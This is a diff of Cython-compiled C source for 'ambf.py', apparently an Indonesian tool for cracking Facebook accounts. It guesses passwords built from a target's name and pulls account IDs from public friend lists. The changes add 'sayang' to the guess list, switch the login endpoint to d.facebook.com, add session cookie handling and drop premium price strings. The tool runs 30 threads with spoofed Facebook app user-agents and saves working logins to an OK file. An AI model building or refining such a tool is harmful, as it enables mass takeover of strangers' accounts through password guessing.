@@ -1473,7 +1473,6 @@ static const char __pyx_k_T[] = "T";
 static const char __pyx_k_Y[] = "Y";
 static const char __pyx_k_a[] = "a";
 static const char __pyx_k_b[] = "b";
-static const char __pyx_k_e[] = "e";
 static const char __pyx_k_i[] = "i";
 static const char __pyx_k_n[] = "n";
 static const char __pyx_k_p[] = "p";
@@ -1810,7 +1809,6 @@ static const char __pyx_k_same_origin[] = "same-origin";
 static const char __pyx_k_session_key[] = "session_key";
 static const char __pyx_k_tanya_total[] = "tanya_total";
 static const char __pyx_k_text_method[] = "text_method";
-static const char __pyx_k_access_token[] = "access_token";
 static const char __pyx_k_apikey___txt[] = ".__apikey__.txt";
 static const char __pyx_k_check_output[] = "check_output";
 static const char __pyx_k_content_type[] = "content-type";
@@ -1850,6 +1848,7 @@ static const char __pyx_k_kembali_ke_menu[] = "\n [+] kembali ke menu ";
 static const char __pyx_k_masukan_id_post[] = " [+] masukan id post : ";
 static const char __pyx_k_pilih_nama_file[] = "\n [?] pilih nama file : ";
 static const char __pyx_k_pip_install_bs4[] = "pip install bs4";
+static const char __pyx_k_session_cookies[] = "session_cookies";
 static const char __pyx_k_submit_Continue[] = "submit[Continue]";
 static const char __pyx_k_touch_login_txt[] = "touch login.txt";
 static const char __pyx_k_tunggu_sebentar[] = " [!] tunggu sebentar....\n";
@@ -1864,7 +1863,6 @@ static const char __pyx_k_0_92m_s_s_s_0_97m[] = "\r  \033[0;92m* --> %s|%s|%s\03
 static const char __pyx_k_2_Masukan_Api_Key[] = " [2]. Masukan Api Key";
 static const char __pyx_k_Akun_Terkena_Spam[] = " [!] Akun Terkena Spam";
 static const char __pyx_k_Api_Key_Terdaftar[] = " [!] Api Key Terdaftar";
-static const char __pyx_k_free_facebook_com[] = "free.facebook.com";
 static const char __pyx_k_masukan_id_target[] = " [+] masukan id target : ";
 static const char __pyx_k_token_kadaluwarsa[] = " [!] token kadaluwarsa";
 static const char __pyx_k_1_Dapatkan_Api_Key[] = " [1]. Dapatkan Api Key";
@@ -1889,6 +1887,7 @@ static const char __pyx_k_2_setting_user_agent[] = " [2]. setting user-agent";
 static const char __pyx_k_Kembali_Ke_Menu_Awal[] = "\n [+] Kembali Ke Menu Awal";
 static const char __pyx_k_first_prefill_source[] = "first_prefill_source";
 static const char __pyx_k_http_ip_api_com_json[] = "http://ip-api.com/json/";
+static const char __pyx_k_https_d_facebook_com[] = "https://d.facebook.com";
 static const char __pyx_k_https_m_facebook_com[] = "https://m.facebook.com";
 static const char __pyx_k_pip_install_requests[] = "pip install requests";
 static const char __pyx_k_status_0_92m_s_0_97m[] = " [*] status      : \033[0;92m%s\033[0;97m";
@@ -1907,7 +1906,6 @@ static const char __pyx_k_had_password_prefilled[] = "had_password_prefilled";
 static const char __pyx_k_total_id_0_91m_s_0_97m[] = "\n [+] total id -> \033[0;91m%s\033[0;97m";
 static const char __pyx_k_Api_Key_Tidak_Terdaftar[] = " [!] Api Key Tidak Terdaftar";
 static const char __pyx_k_api_key_tidak_terdaftar[] = " [!] api key tidak terdaftar";
-static const char __pyx_k_https_free_facebook_com[] = "https://free.facebook.com";
 static const char __pyx_k_sedang_prosess_cek_akun[] = " [*] sedang prosess cek akun....";
 static const char __pyx_k_x_fb_connection_quality[] = "x-fb-connection-quality";
 static const char __pyx_k_3_method_mobile_mode_low[] = " [3]. method mobile (mode low)";
@@ -1917,7 +1915,6 @@ static const char __pyx_k_pilih_user_agent_hp_anda[] = "\n [ pilih user-agent hp
 static const char __pyx_k_total_akun_0_91m_s_0_97m[] = " [+] total akun : \033[0;91m%s\033[0;97m";
 static const char __pyx_k_1_crack_dari_publik_teman[] = " [1]. crack dari publik teman";
 static const char __pyx_k_2_method_mbasic_mode_slow[] = " [2]. method mbasic (mode slow)";
-static const char __pyx_k_List_Harga_Script_Premium[] = "\n [ List Harga Script Premium ]\n";
 static const char __pyx_k_berhasil_ganti_user_agent[] = "\n [+] berhasil ganti user agent";
 static const char __pyx_k_https_mbasic_facebook_com[] = "https://mbasic.facebook.com";
 static const char __pyx_k_upgrade_insecure_requests[] = "upgrade-insecure-requests";
@@ -1939,14 +1936,12 @@ static const char __pyx_k_hasil_OK_disimpan_ke_OK_s_txt[] = "\n [+] hasil OK dis
 static const char __pyx_k_kata_sandi_minimal_6_karakter[] = "\n [!] kata sandi minimal 6 karakter";
 static const char __pyx_k_login_next_ref_dbl_fl_refid_8[] = "/login/?next&ref=dbl&fl&refid=8";
 static const char __pyx_k_Api_Key_Kamu_Sudah_Kadaluwarsa[] = " [!] Api Key Kamu Sudah Kadaluwarsa";
-static const char __pyx_k_Durasi_1_Bulan_Harga_Rp_20_000[] = " [+] Durasi 1 Bulan Harga Rp 20.000";
 static const char __pyx_k_api_key_kamu_sudah_kadaluwarsa[] = " [!] api key kamu sudah kadaluwarsa";
 static const char __pyx_k_menggunakan_kata_sandi_0_91m_s[] = " [+] menggunakan kata sandi -> \033[0;91m%s\033[0;97m";
 static const char __pyx_k_pilih_method_crack_coba_method[] = " \n [ pilih method crack - coba method satu\302\262 ]\n";
 static const char __pyx_k_0_91m0_0_97m_keluar_hapus_token[] = " [\033[0;91m0\033[0;97m]. keluar (hapus token)";
 static const char __pyx_k_Copy_Api_Key_Anda_Lalu_Daftar_A[] = " [*] Copy Api Key Anda Lalu Daftar Api Key Ke Admin";
 static const char __pyx_k_Dalvik_2_1_0_Linux_U_Android_11[] = "Dalvik/2.1.0 (Linux; U; Android 11; SM-F700W Build/RP1A.200720.012; wv) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]";
-static const char __pyx_k_Durasi_Unlimited_Harga_Rp_50_00[] = " [+] Durasi Unlimited Harga Rp 50.000";
 static const char __pyx_k_FBAN_FB4A_FBAV_222_0_0_48_113_F[] = "[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]";
 static const char __pyx_k_FBAN_FB4A_FBAV_276_0_0_44_127_F[] = "[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129382;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/227665120;FBCR/AT&amp-T;FBMF/Nokia 7 plus;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]";
 static const char __pyx_k_Mozilla_5_0_Linux_Android_10_Mi[] = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]";
@@ -1965,7 +1960,6 @@ static const char __pyx_k_jika_tidak_ada_hasil_hidupkan_m[] = " [!] jika tidak a
 static const char __pyx_k_keluar_tunggu_sebentar_sedang_u[] = " [!] keluar, tunggu sebentar sedang update tools\n";
 static const char __pyx_k_ketik_0_93mhelp_0_97m_untuk_lih[] = " [?] ketik '\033[0;93mhelp\033[0;97m' untuk lihat tutorial ambil token facebook";
 static const char __pyx_k_list_nama_file_tersimpan_di_fol[] = " [*] list nama file tersimpan di folder OK\n";
-static const char __pyx_k_login_device_based_regular_logi[] = "/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8";
 static const char __pyx_k_login_gagal_silahkan_cek_kembal[] = " [!] login gagal, silahkan cek kembali id dan kata sandi";
 static const char __pyx_k_module_futures_belum_terinstall[] = "\n [!] module futures belum terinstall";
 static const char __pyx_k_module_requests_belum_terinstal[] = "\n [!] module requests belum terinstall";
@@ -1979,7 +1973,6 @@ static const char __pyx_k_user_aktif_selamat_datang_0_93m[] = "\n [+] user aktif
 static const char __pyx_k_Dalvik_1_6_0_Linux_U_Android_4_4[] = "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/id_ID;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]";
 static const char __pyx_k_Mozilla_5_0_Linux_Android_5_0_AS[] = "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36";
 static const char __pyx_k_Mozilla_5_0_Linux_Android_9_CPH1[] = "Mozilla/5.0 (Linux; Android 9; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]";
-static const char __pyx_k_NokiaC3_00_5_0_07_20_Profile_MID[] = "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+";
 static const char __pyx_k_application_x_www_form_urlencode[] = "application/x-www-form-urlencoded";
 static const char __pyx_k_cell_CTRadioAccessTechnologyHSDP[] = "cell.CTRadioAccessTechnologyHSDPA";
 static const char __pyx_k_hello_admin_saya_ingin_beli_scri[] = "hello admin, saya ingin beli script premium\n\n";
@@ -2074,9 +2067,7 @@ static PyObject *__pyx_kp_s_Dalvik_1_6_0_Linux_U_Android_4_4;
 static PyObject *__pyx_kp_s_Dalvik_2_1_0_Linux_U_Android_11;
 static PyObject *__pyx_n_s_Desember;
 static PyObject *__pyx_kp_s_Durasi;
-static PyObject *__pyx_kp_s_Durasi_1_Bulan_Harga_Rp_20_000;
 static PyObject *__pyx_kp_s_Durasi_2;
-static PyObject *__pyx_kp_s_Durasi_Unlimited_Harga_Rp_50_00;
 static PyObject *__pyx_n_s_EAAA;
 static PyObject *__pyx_n_s_EXCELLENT;
 static PyObject *__pyx_kp_s_Email;
@@ -2097,7 +2088,6 @@ static PyObject *__pyx_kp_s_Kembali_Ke_Menu_Awal;
 static PyObject *__pyx_n_s_KeyError;
 static PyObject *__pyx_n_s_Lanjutkan;
 static PyObject *__pyx_n_s_Liger;
-static PyObject *__pyx_kp_s_List_Harga_Script_Premium;
 static PyObject *__pyx_n_s_Maret;
 static PyObject *__pyx_kp_s_Masukan_Api_Key;
 static PyObject *__pyx_n_s_Mei;
@@ -2106,7 +2096,6 @@ static PyObject *__pyx_kp_s_Mozilla_5_0_Linux_Android_5_0_AS;
 static PyObject *__pyx_kp_s_Mozilla_5_0_Linux_Android_9_CPH1;
 static PyObject *__pyx_kp_s_Nama;
 static PyObject *__pyx_kp_s_Nama_2;
-static PyObject *__pyx_kp_s_NokiaC3_00_5_0_07_20_Profile_MID;
 static PyObject *__pyx_n_s_November;
 static PyObject *__pyx_n_s_OK;
 static PyObject *__pyx_kp_s_OK_s;
@@ -2141,7 +2130,6 @@ static PyObject *__pyx_n_s_a;
 static PyObject *__pyx_n_s_accept;
 static PyObject *__pyx_kp_s_accept_encoding;
 static PyObject *__pyx_kp_s_accept_language;
-static PyObject *__pyx_n_s_access_token;
 static PyObject *__pyx_n_s_action;
 static PyObject *__pyx_kp_s_akun_tidak_checkpoint;
 static PyObject *__pyx_kp_s_akun_tidak_tersedia_atau_list_f;
@@ -2224,7 +2212,6 @@ static PyObject *__pyx_n_s_div;
 static PyObject *__pyx_n_s_document;
 static PyObject *__pyx_n_s_dtsg;
 static PyObject *__pyx_n_s_durasi;
-static PyObject *__pyx_n_s_e;
 static PyObject *__pyx_n_s_email;
 static PyObject *__pyx_kp_s_email_s;
 static PyObject *__pyx_n_s_end;
@@ -2250,7 +2237,6 @@ static PyObject *__pyx_n_s_flush;
 static PyObject *__pyx_n_s_fm;
 static PyObject *__pyx_n_s_follower;
 static PyObject *__pyx_n_s_form;
-static PyObject *__pyx_kp_s_free_facebook_com;
 static PyObject *__pyx_n_s_gaaa;
 static PyObject *__pyx_n_s_ged;
 static PyObject *__pyx_n_s_get;
@@ -2276,7 +2262,7 @@ static PyObject *__pyx_kp_s_html_parser;
 static PyObject *__pyx_kp_s_http_ip_api_com_json;
 static PyObject *__pyx_kp_s_https_api_whatsapp_com_send_phon;
 static PyObject *__pyx_kp_s_https_b_api_facebook_com_method;
-static PyObject *__pyx_kp_s_https_free_facebook_com;
+static PyObject *__pyx_kp_s_https_d_facebook_com;
 static PyObject *__pyx_kp_s_https_graph_facebook_com_me_acce;
 static PyObject *__pyx_kp_s_https_graph_facebook_com_me_acce_2;
 static PyObject *__pyx_kp_s_https_graph_facebook_com_s_acces;
@@ -2331,7 +2317,6 @@ static PyObject *__pyx_kp_s_list_nama_file_tersimpan_di_fol;
 static PyObject *__pyx_kp_s_list_nama_file_tersimpan_di_fol_2;
 static PyObject *__pyx_n_s_listdir;
 static PyObject *__pyx_n_s_login;
-static PyObject *__pyx_kp_s_login_device_based_regular_logi;
 static PyObject *__pyx_n_s_login_error;
 static PyObject *__pyx_kp_s_login_gagal_silahkan_cek_kembal;
 static PyObject *__pyx_kp_s_login_next_ref_dbl_fl_refid_8;
@@ -2450,6 +2435,7 @@ static PyObject *__pyx_kp_s_sedang_prosess_cek_akun;
 static PyObject *__pyx_kp_s_selamat_datang_0_93m_s_0_97m;
 static PyObject *__pyx_n_s_send;
 static PyObject *__pyx_n_s_ses;
+static PyObject *__pyx_n_s_session_cookies;
 static PyObject *__pyx_n_s_session_key;
 static PyObject *__pyx_n_s_setting_ua;
 static PyObject *__pyx_n_s_sleep;
@@ -11741,7 +11727,7 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
  * 					uid, name = user.split("<=>")
  * 					ss = name.split(" ")             # <<<<<<<<<<<<<<
  * 					if len(ss) == 3 or len(ss) == 4 or len(ss) == 5:
- * 						pwx = [ name, ss[0]+"123", ss[0]+"12345" ]
+ * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]
  */
                 __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_name, __pyx_n_s_split); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 394, __pyx_L81_error)
                 __Pyx_GOTREF(__pyx_t_4);
@@ -11767,7 +11753,7 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
  * 					uid, name = user.split("<=>")
  * 					ss = name.split(" ")
  * 					if len(ss) == 3 or len(ss) == 4 or len(ss) == 5:             # <<<<<<<<<<<<<<
- * 						pwx = [ name, ss[0]+"123", ss[0]+"12345" ]
+ * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]
  * 					else:
  */
                 __pyx_t_19 = PyObject_Length(__pyx_v_ss); if (unlikely(__pyx_t_19 == ((Py_ssize_t)-1))) __PYX_ERR(0, 395, __pyx_L81_error)
@@ -11793,7 +11779,7 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
                   /* "ambf.py":396
  * 					ss = name.split(" ")
  * 					if len(ss) == 3 or len(ss) == 4 or len(ss) == 5:
- * 						pwx = [ name, ss[0]+"123", ss[0]+"12345" ]             # <<<<<<<<<<<<<<
+ * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]             # <<<<<<<<<<<<<<
  * 					else:
  * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]
  */
@@ -11807,7 +11793,7 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
                   __pyx_t_16 = PyNumber_Add(__pyx_t_15, __pyx_kp_s_12345); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 396, __pyx_L81_error)
                   __Pyx_GOTREF(__pyx_t_16);
                   __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
-                  __pyx_t_15 = PyList_New(3); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 396, __pyx_L81_error)
+                  __pyx_t_15 = PyList_New(4); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 396, __pyx_L81_error)
                   __Pyx_GOTREF(__pyx_t_15);
                   __Pyx_INCREF(__pyx_v_name);
                   __Pyx_GIVEREF(__pyx_v_name);
@@ -11816,6 +11802,9 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
                   PyList_SET_ITEM(__pyx_t_15, 1, __pyx_t_4);
                   __Pyx_GIVEREF(__pyx_t_16);
                   PyList_SET_ITEM(__pyx_t_15, 2, __pyx_t_16);
+                  __Pyx_INCREF(__pyx_n_s_sayang);
+                  __Pyx_GIVEREF(__pyx_n_s_sayang);
+                  PyList_SET_ITEM(__pyx_t_15, 3, __pyx_n_s_sayang);
                   __pyx_t_4 = 0;
                   __pyx_t_16 = 0;
                   __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_15));
@@ -11825,14 +11814,14 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
  * 					uid, name = user.split("<=>")
  * 					ss = name.split(" ")
  * 					if len(ss) == 3 or len(ss) == 4 or len(ss) == 5:             # <<<<<<<<<<<<<<
- * 						pwx = [ name, ss[0]+"123", ss[0]+"12345" ]
+ * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]
  * 					else:
  */
                   goto __pyx_L91;
                 }
 
                 /* "ambf.py":398
- * 						pwx = [ name, ss[0]+"123", ss[0]+"12345" ]
+ * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]
  * 					else:
  * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]             # <<<<<<<<<<<<<<
  * 					coeg.submit(api, uid, pwx)
@@ -12277,7 +12266,7 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
  * 					uid, name = user.split("<=>")
  * 					ss = name.split(" ")             # <<<<<<<<<<<<<<
  * 					if len(ss) == 3 or len(ss) == 4 or len(ss) == 5:
- * 						pwx = [ name, ss[0]+"123", ss[0]+"12345" ]
+ * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]
  */
                 __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_name, __pyx_n_s_split); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 406, __pyx_L105_error)
                 __Pyx_GOTREF(__pyx_t_7);
@@ -12303,7 +12292,7 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
  * 					uid, name = user.split("<=>")
  * 					ss = name.split(" ")
  * 					if len(ss) == 3 or len(ss) == 4 or len(ss) == 5:             # <<<<<<<<<<<<<<
- * 						pwx = [ name, ss[0]+"123", ss[0]+"12345" ]
+ * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]
  * 					else:
  */
                 __pyx_t_19 = PyObject_Length(__pyx_v_ss); if (unlikely(__pyx_t_19 == ((Py_ssize_t)-1))) __PYX_ERR(0, 407, __pyx_L105_error)
@@ -12329,7 +12318,7 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
                   /* "ambf.py":408
  * 					ss = name.split(" ")
  * 					if len(ss) == 3 or len(ss) == 4 or len(ss) == 5:
- * 						pwx = [ name, ss[0]+"123", ss[0]+"12345" ]             # <<<<<<<<<<<<<<
+ * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]             # <<<<<<<<<<<<<<
  * 					else:
  * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]
  */
@@ -12343,7 +12332,7 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
                   __pyx_t_15 = PyNumber_Add(__pyx_t_4, __pyx_kp_s_12345); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 408, __pyx_L105_error)
                   __Pyx_GOTREF(__pyx_t_15);
                   __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
-                  __pyx_t_4 = PyList_New(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 408, __pyx_L105_error)
+                  __pyx_t_4 = PyList_New(4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 408, __pyx_L105_error)
                   __Pyx_GOTREF(__pyx_t_4);
                   __Pyx_INCREF(__pyx_v_name);
                   __Pyx_GIVEREF(__pyx_v_name);
@@ -12352,6 +12341,9 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
                   PyList_SET_ITEM(__pyx_t_4, 1, __pyx_t_7);
                   __Pyx_GIVEREF(__pyx_t_15);
                   PyList_SET_ITEM(__pyx_t_4, 2, __pyx_t_15);
+                  __Pyx_INCREF(__pyx_n_s_sayang);
+                  __Pyx_GIVEREF(__pyx_n_s_sayang);
+                  PyList_SET_ITEM(__pyx_t_4, 3, __pyx_n_s_sayang);
                   __pyx_t_7 = 0;
                   __pyx_t_15 = 0;
                   __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_4));
@@ -12361,17 +12353,17 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
  * 					uid, name = user.split("<=>")
  * 					ss = name.split(" ")
  * 					if len(ss) == 3 or len(ss) == 4 or len(ss) == 5:             # <<<<<<<<<<<<<<
- * 						pwx = [ name, ss[0]+"123", ss[0]+"12345" ]
+ * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]
  * 					else:
  */
                   goto __pyx_L115;
                 }
 
                 /* "ambf.py":410
- * 						pwx = [ name, ss[0]+"123", ss[0]+"12345" ]
+ * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]
  * 					else:
  * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]             # <<<<<<<<<<<<<<
- * 					coeg.submit(crack, uid, pwx, "https://mbasic.facebook.com")
+ * 					coeg.submit(crack, uid, pwx, "https://d.facebook.com")
  * 			exit("\n\n [#] crack selesai...")
  */
                 /*else*/ {
@@ -12407,7 +12399,7 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
                 /* "ambf.py":411
  * 					else:
  * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]
- * 					coeg.submit(crack, uid, pwx, "https://mbasic.facebook.com")             # <<<<<<<<<<<<<<
+ * 					coeg.submit(crack, uid, pwx, "https://d.facebook.com")             # <<<<<<<<<<<<<<
  * 			exit("\n\n [#] crack selesai...")
  * 		elif method in ["3", "03"]:
  */
@@ -12429,7 +12421,7 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
                 }
                 #if CYTHON_FAST_PYCALL
                 if (PyFunction_Check(__pyx_t_7)) {
-                  PyObject *__pyx_temp[5] = {__pyx_t_16, __pyx_t_15, __pyx_v_uid, __pyx_v_pwx, __pyx_kp_s_https_mbasic_facebook_com};
+                  PyObject *__pyx_temp[5] = {__pyx_t_16, __pyx_t_15, __pyx_v_uid, __pyx_v_pwx, __pyx_kp_s_https_d_facebook_com};
                   __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_17, 4+__pyx_t_17); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 411, __pyx_L105_error)
                   __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                   __Pyx_GOTREF(__pyx_t_4);
@@ -12438,7 +12430,7 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
                 #endif
                 #if CYTHON_FAST_PYCCALL
                 if (__Pyx_PyFastCFunction_Check(__pyx_t_7)) {
-                  PyObject *__pyx_temp[5] = {__pyx_t_16, __pyx_t_15, __pyx_v_uid, __pyx_v_pwx, __pyx_kp_s_https_mbasic_facebook_com};
+                  PyObject *__pyx_temp[5] = {__pyx_t_16, __pyx_t_15, __pyx_v_uid, __pyx_v_pwx, __pyx_kp_s_https_d_facebook_com};
                   __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_17, 4+__pyx_t_17); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 411, __pyx_L105_error)
                   __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                   __Pyx_GOTREF(__pyx_t_4);
@@ -12459,9 +12451,9 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
                   __Pyx_INCREF(__pyx_v_pwx);
                   __Pyx_GIVEREF(__pyx_v_pwx);
                   PyTuple_SET_ITEM(__pyx_t_13, 2+__pyx_t_17, __pyx_v_pwx);
-                  __Pyx_INCREF(__pyx_kp_s_https_mbasic_facebook_com);
-                  __Pyx_GIVEREF(__pyx_kp_s_https_mbasic_facebook_com);
-                  PyTuple_SET_ITEM(__pyx_t_13, 3+__pyx_t_17, __pyx_kp_s_https_mbasic_facebook_com);
+                  __Pyx_INCREF(__pyx_kp_s_https_d_facebook_com);
+                  __Pyx_GIVEREF(__pyx_kp_s_https_d_facebook_com);
+                  PyTuple_SET_ITEM(__pyx_t_13, 3+__pyx_t_17, __pyx_kp_s_https_d_facebook_com);
                   __pyx_t_15 = 0;
                   __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_13, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 411, __pyx_L105_error)
                   __Pyx_GOTREF(__pyx_t_4);
@@ -12566,7 +12558,7 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
 
       /* "ambf.py":412
  * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]
- * 					coeg.submit(crack, uid, pwx, "https://mbasic.facebook.com")
+ * 					coeg.submit(crack, uid, pwx, "https://d.facebook.com")
  * 			exit("\n\n [#] crack selesai...")             # <<<<<<<<<<<<<<
  * 		elif method in ["3", "03"]:
  * 			with ThreadPoolExecutor(max_workers=30) as coeg:
@@ -12586,7 +12578,7 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
     }
 
     /* "ambf.py":413
- * 					coeg.submit(crack, uid, pwx, "https://mbasic.facebook.com")
+ * 					coeg.submit(crack, uid, pwx, "https://d.facebook.com")
  * 			exit("\n\n [#] crack selesai...")
  * 		elif method in ["3", "03"]:             # <<<<<<<<<<<<<<
  * 			with ThreadPoolExecutor(max_workers=30) as coeg:
@@ -12816,7 +12808,7 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
  * 					uid, name = user.split("<=>")
  * 					ss = name.split(" ")             # <<<<<<<<<<<<<<
  * 					if len(ss) == 3 or len(ss) == 4 or len(ss) == 5:
- * 						pwx = [ name, ss[0]+"123", ss[0]+"12345" ]
+ * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]
  */
                 __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_v_name, __pyx_n_s_split); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 418, __pyx_L129_error)
                 __Pyx_GOTREF(__pyx_t_13);
@@ -12842,7 +12834,7 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
  * 					uid, name = user.split("<=>")
  * 					ss = name.split(" ")
  * 					if len(ss) == 3 or len(ss) == 4 or len(ss) == 5:             # <<<<<<<<<<<<<<
- * 						pwx = [ name, ss[0]+"123", ss[0]+"12345" ]
+ * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]
  * 					else:
  */
                 __pyx_t_19 = PyObject_Length(__pyx_v_ss); if (unlikely(__pyx_t_19 == ((Py_ssize_t)-1))) __PYX_ERR(0, 419, __pyx_L129_error)
@@ -12868,7 +12860,7 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
                   /* "ambf.py":420
  * 					ss = name.split(" ")
  * 					if len(ss) == 3 or len(ss) == 4 or len(ss) == 5:
- * 						pwx = [ name, ss[0]+"123", ss[0]+"12345" ]             # <<<<<<<<<<<<<<
+ * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]             # <<<<<<<<<<<<<<
  * 					else:
  * 						pwx = [ name, ss[0]+"123", ss[0]+"12345", "sayang" ]
  */
@@ -12882,7 +12874,7 @@ static PyObject *__pyx_pf_4ambf_20method(CYTHON_UNUSED PyObject *__pyx_self) {
                   __pyx_t_4 = PyNumber_Add(__pyx_t_7, __pyx_kp_s_12345); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 420, __pyx_L129_error)
                   __Pyx_GOTREF(__pyx_t_4);
                   __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
-                  __pyx_t_7 = PyList_New(3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 420, __pyx_L129_error)
+                  __pyx_t_7 = PyList_New(4); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 420, __pyx_L129_error)
                   __Pyx_GOTREF(__pyx_t_7);
